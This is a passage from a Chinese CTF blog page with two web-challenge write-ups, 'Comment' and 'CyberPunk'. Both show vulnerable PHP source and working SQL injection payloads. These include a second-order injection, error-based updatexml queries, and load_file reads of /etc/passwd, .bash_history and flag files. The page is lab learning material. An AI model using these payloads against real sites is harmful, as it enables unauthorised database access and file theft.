class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>类似刚做过的<strong>CyberPunk</strong>，对输入做了转义，然而<code>$category = mysql_fetch_array($result)[&#39;category&#39;];</code>却直接抓取了结果，也就是说，存在二次注入。</p>
<h4><span id="二次注入">二次注入</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>这里即是关键的注入点，content会取出未转义的单引号进行闭合</p>
<p>关键是如何构造，这是十分关键的</p>
<blockquote>
<p>注意：这里的content是commend的content，不是帖子的content</p>
</blockquote>
<p>这里的sql语句是多行的，注释需要用多行注释：</p>
<p>令category=’,content=database(),/<em>，在留言中输入\</em>/#：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;&#x27;,content=database(),/*&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;*/#&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>这样构造，<code>/**/</code>注释掉跨行<code>&#39;</code>，#注释掉后面的单引号，content就会成功被我们劫持，我们在留言后语句就会成功执行完成注入。</p>
<p>但是注库名时发现没有回显，一番尝试……放弃……</p>
<p>load_file读取passwd：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/songxingzhu/p/6364700.html">https://www.cnblogs.com/songxingzhu/p/6364700.html</a></p>
</blockquote>
<img src="/images/网鼎杯-2018-Comment/image-20210424155009903.png" alt="image-20210424155009903" style="zoom:80%;">

<p>最下面有一个www用户，目录为/home/www，默认shell为bin/bash，由此可以查一下该用户的shell历史：</p>
<h4><span id="bash_history">.bash_history</span></h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011479200/article/details/86501366">https://blog.csdn.net/u011479200/article/details/86501366</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/chinalinuxzend/article/details/1849419">命令记录.bash_history</a></p>
<p>查下/home/www/下的命令使用历史：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/ </span><br><span class="line">unzip html.zip </span><br><span class="line">rm -f html.zip </span><br><span class="line">cp -r html /var/www/ </span><br><span class="line"><span class="built_in">cd</span> /var/www/html/ </span><br><span class="line">rm -f .DS_Store </span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<p>.DS_Store似乎是一种泄露，在网页上线前删掉了，但是/tmp/html中应该是存在的：</p>
<p>读取发现是乱码且显示不完整，用hex()读取：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bud1</span><br><span class="line">strapIl	bootstrapIlocblobF(������comment.phpIlocblob�(��cssIlocblobR(������flag_8946e1ff1ee3e40f.phpIlocblob�(������fontsIlocblobF�������	index.phpIlocblob����jsIlocblobR�������	login.phpIlocblob��������	mysql.phpIlocblobF������vendorIlocblob�������write_do.phpIlocblobR������ @� @� @� @E</span><br></pre></td></tr></table></figure>

<p>发现flag_8946e1ff1ee3e40f.php，可以着手读flag了……</p>
<p>我寻思哪个目录下的flag文件应该都一样，结果不一样，必须读/var/www/html/下面的……</p>
<p><code>category=&#39;,content=hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/*</code></p>
<p>获得flag……</p>
<img src="/images/网鼎杯-2018-Comment/image-20210424160546854.png" alt="image-20210424160546854" style="zoom:50%;">

<p>……tql</p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-04-23  <a class="commentCountImg" href="/2021/04/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/#comment-container"><span class="display-none-class">/2021/04/23/CISCN2019-华北赛区-Day1-Web5-CyberPunk/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="cc9dcf1aaabf204c01b8cb5ca36fcef9">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>5 分钟  <i class="fas fa-pencil-alt"> </i>0.8 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/">CISCN2019-华北赛区-Day1-Web5-CyberPunk</a></h1><div class="content"><h3><span id="ciscn2019-华北赛区-day1-web5cyberpunk">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</span></h3><img src="/images/CISCN2019-华北赛区-Day1-Web5-CyberPunk/image-20210423174538565.png" alt="image-20210423174538565" style="zoom:40%;">

<p>摸索一下，有添加订单，查找订单，删除订单，确认订单，更改订单的功能：</p>
<p>index、confirm、delete、search、change、config</p>
<p>index页面有提示：?file，用php://读取：</p>
<p>index.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--?file=?--&gt;</span><br></pre></td></tr></table></figure>

<p>其他页面都有针对sql的过滤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>我们可以发现，address(地址)没有过滤……</p>
<p>在添加订单功能中（confirm.php）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$re-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, $user_name, $address, $phone);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>bind_param：</p>
<p>该函数绑定了 SQL 的参数，且告诉数据库参数的值。 “sss” 参数列处理其余参数的数据类型。s 字符告诉数据库该参数为字符串。</p>
<p>参数有以下四种类型:</p>
<p>i - integer（整型）<br>d - double（双精度浮点型）<br>s - string（字符串）<br>b - BLOB（布尔值）</p>
</blockquote>
<p>这个函数的使用绑定了参数为字符串，有效防止了sql注入……</p>
<p>change.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$address = addslashes($_POST[&quot;address&quot;]);</code>对修改值进行了转义操作……</p>
<p>由于报错信息是可以打印出来的，是一个新的知识点：</p>
<h3><span id="报错注入">报错注入</span></h3><p><a target="_blank" rel="noopener" href="https://blkstone.github.io/2017/11/09/updatexml-sqli/">https://blkstone.github.io/2017/11/09/updatexml-sqli/</a></p>
<p>利用updatexml的中间不合语法的参数报错带出数据</p>
<p>至于二次注入，很多wp都没解释……我猜测一波……</p>
<p>在更新数据时，虽然对修改值进行了转义操作，但不会将<code>\</code>带入数据库，拿出时仍是<code>&#39;</code>。</p>
<p><code>$row = $fetch-&gt;fetch_assoc();</code>抓取的是上一次的数据</p>
<p>“‘, `old_address`=’”.$row[‘address’]是上一次的address，这使得 <strong>‘</strong> 依然起效……</p>
<p>我们先注入报错语句，再在change随便更改下，上次注入语句便开始工作，获得报错内容，带出数据。</p>
<p>构造语句使符合语法进行报错注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span><br><span class="line"></span><br><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e),1)#</span><br><span class="line"></span><br><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;0x75736572)),20,30),0x7e),1)#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查了一大波东西，似乎没有flag……?</p>
<p>原题目好像告诉了要读根目录的flag.txt……</p>
<p><code>address=1&#39; where user_id=updatexml(1,concat(0x7e,substr(load_file(&#39;/flag.txt&#39;),1,20),0x7e),1)#</code></p>
<img src="/images/CISCN2019-华北赛区-Day1-Web5-CyberPunk/image-20210423190458532.png" alt="image-20210423190458532" style="zoom:80%;">

<p><code>address=1&#39; where user_id=updatexml(1,concat(0x7e,substr(load_file(&#39;/flag.txt&#39;),20,60),0x7e),1)#</code></p>
<p>flag{db0fd1ea-0731-4</p>
<p>b94-ad41-e7e6192643eb}</p>
<p>得到了flag……</p>
</div><div class="index-category-tag">  <hr></div></article></div><!--!--><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/page/3/">上一页</a></div><div class="pagination-next"><a href="/page/5/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><a class="pagination-link is-current" href="/page/4/">4</a></li><li><a class="pagination-link" href="/page/5/">5</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/12/">12</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/header.jpg" alt="inanb"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">inanb</p><p class="is-size-6 is-block">铁马冰河入梦来</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">119</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">9</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/inanb" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/inanb"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-09T14:59:16.144Z">2021-11-09</time></p><p class="title"><a href="/2021/11/09/%E5%AE%9E%E9%AA%8C--%E9%80%9A%E8%BF%87FTP_SSRF_%E6%94%BB%E5%87%BBPHP-FPM/"> </a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-09T00:45:03.161Z">2021-11-09</time></p><p class="title"><a href="/2021/11/09/%E5%AE%9E%E9%AA%8C--SSRF_PHP-FPM/"> </a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-08T13:48:42.267Z">2021-11-08</time></p><p class="title"><a href="/2021/11/08/%E5%AE%9E%E9%AA%8C--PHP-FPM_%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"> </a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-24T13:27:46.244Z">2021-09-24</time></p><p class="title"><a href="/2021/09/24/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay_eval/"> </a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-21T08:18:19.243Z">2021-09-21</time></p><p class="title"><a href="/2021/09/21/SUCTF-2018-MultiSQL/">SUCTF-2018-MultiSQL</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/LeetCode/"><span class="level-start"><span class="level-item">LeetCode</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/WEB/"><span class="level-start"><span class="level-item">WEB</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/web/"><span class="level-start"><span class="level-item">web</span></span><span class="level-end"><span class="level-item tag">27</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"><span class="level-start"><span class="level-item">学习报告</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">笔记</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">20</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/buuctf/"><span class="tag">buuctf</span><span class="tag is-grey-lightest">27</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf/"><span class="tag">Buuctf</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"><span class="tag">php变量覆盖</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><span class="tag">伪协议</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">Buuctf PHP代码审计 文件包含</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf-SQL/"><span class="tag">Buuctf SQL</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Html%E5%92%8Ccss/"><span class="tag">Html和css</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/inanb.png" alt="inanb" height="28"></a><p class="size-small"><span>&copy; 2021 inanb</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><div class="size-small"><span>❤️感谢 <strong><span id="busuanzi_value_site_uv">99+</span></strong> 小伙伴的 <strong><span id="busuanzi_value_site_pv">99+</span></strong> 次光临！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2165337463" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
